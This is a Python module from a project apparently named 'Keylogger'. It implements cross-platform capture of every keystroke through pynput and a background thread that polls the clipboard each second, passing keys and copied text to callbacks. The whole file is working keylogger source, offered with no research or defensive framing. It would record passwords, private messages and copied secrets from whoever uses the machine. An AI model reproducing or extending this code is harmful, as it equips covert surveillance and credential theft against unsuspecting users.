"""
Input Capture Module

Cross-platform keyboard and clipboard input capture.
Supports Linux (X11/evdev), macOS (Quartz), and Windows (pynput).
"""

import sys
import logging
from typing import Optional, Callable, Dict, Any

logger = logging.getLogger("Keylogger.capture")


class InputCapture:
    """
    Cross-platform input capture for keyboard and clipboard.
    
    Automatically detects the platform and uses the appropriate
    input capture method.
    """
    
    def __init__(
        self,
        callback: Callable[[Dict[str, Any]], None],
        log_clipboard: bool = True,
        clipboard_callback: Optional[Callable[[str], None]] = None,
        debug: bool = False
    ):
        """
        Initialize input capture.
        
        Args:
            callback: Function to call on key events
            log_clipboard: Enable clipboard monitoring
            clipboard_callback: Function to call on clipboard changes
            debug: Enable debug logging
        """
        self.callback = callback
        self.log_clipboard = log_clipboard
        self.clipboard_callback = clipboard_callback
        self.debug = debug
        self.running = False
        
        # Platform-specific imports
        self.listener = None
        self._platform = sys.platform
        
        logger.info(f"Initializing input capture for platform: {self._platform}")
    
    def _get_key_info(self, key) -> Dict[str, Any]:
        """
        Extract key information from platform-specific key object.
        
        Args:
            key: Platform-specific key object
            
        Returns:
            Dict with key information
        """
        try:
            from pynput.keyboard import KeyCode, Key
            
            key_info = {
                'key': None,
                'char': None,
                'modifiers': [],
                'pressed': True
            }
            
            if isinstance(key, KeyCode):
                if key.char:
                    key_info['char'] = key.char
                    key_info['key'] = key.char
                else:
                    key_info['key'] = f"VK_{key.vk}"
            elif isinstance(key, Key):
                key_info['key'] = key.name
            
            return key_info
            
        except Exception as e:
            logger.error(f"Error extracting key info: {e}")
            return {'key': 'unknown', 'char': None}
    
    def _on_press(self, key):
        """Handle key press events."""
        if not self.running:
            return False
        
        key_info = self._get_key_info(key)
        key_info['pressed'] = True
        
        try:
            self.callback(key_info)
        except Exception as e:
            logger.error(f"Callback error: {e}")
        
        return self.running
    
    def _on_release(self, key):
        """Handle key release events."""
        if not self.running:
            return False
        
        key_info = self._get_key_info(key)
        key_info['pressed'] = False
        
        # Only log releases for special keys
        if key_info['key'] and not key_info['char']:
            try:
                self.callback(key_info)
            except Exception as e:
                logger.error(f"Callback error: {e}")
        
        return self.running
    
    def _start_clipboard_monitor(self):
        """Start clipboard monitoring thread."""
        if not self.log_clipboard or not self.clipboard_callback:
            return
        
        import threading
        import time
        
        def monitor():
            last_content = ""
            try:
                import pyperclip
            except ImportError:
                logger.warning("pyperclip not installed. Clipboard monitoring disabled.")
                return
            
            while self.running:
                try:
                    content = pyperclip.paste()
                    if content and content != last_content:
                        last_content = content
                        self.clipboard_callback(content)
                except Exception as e:
                    if self.debug:
                        logger.debug(f"Clipboard monitor error: {e}")
                time.sleep(1)
        
        thread = threading.Thread(target=monitor, daemon=True)
        thread.start()
        logger.debug("Clipboard monitor started")
    
    def start(self):
        """Start input capture."""
        if self.running:
            logger.warning("Input capture already running")
            return
        
        self.running = True
        
        try:
            from pynput.keyboard import Listener
            
            self.listener = Listener(
                on_press=self._on_press,
                on_release=self._on_release
            )
            
            # Start clipboard monitoring
            self._start_clipboard_monitor()
            
            # Start keyboard listener
            logger.info("Starting keyboard listener...")
            self.listener.start()
            self.listener.join()
            
        except ImportError:
            logger.error("pynput not installed. Install with: pip install pynput")
            raise
        except Exception as e:
            logger.error(f"Failed to start input capture: {e}")
            raise
    
    def stop(self):
        """Stop input capture."""
        if not self.running:
            return
        
        logger.info("Stopping input capture...")
        self.running = False
        
        if self.listener:
            try:
                self.listener.stop()
            except Exception as e:
                logger.error(f"Error stopping listener: {e}")
        
        logger.info("Input capture stopped")
